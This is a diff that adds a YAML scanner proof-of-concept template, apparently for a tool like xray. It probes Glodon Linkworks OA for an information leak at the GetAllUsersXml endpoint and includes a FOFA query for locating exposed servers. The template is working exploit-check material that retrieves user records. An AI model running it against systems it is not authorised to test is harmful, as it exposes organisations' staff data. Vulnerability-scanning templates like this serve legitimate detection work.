@@ -1,0 +1,15 @@
+id: poc-yaml-glodon-getallusersxml-info-leak
+info:
+  name: 广联达OA GetAllUsersXml 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 广联达 Linkworks办公OA
+  fofa: header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"
+requests:
+- method: GET
+  path: /Org/service/Service.asmx/GetAllUsersXml
+  expression: status_code == 200 && contains(body,"><User UserId") && contains(body,"Code=")
+    && contains(body,"Name=") && contains(content_type,"text/xml")
+variables: {}
+transport: http
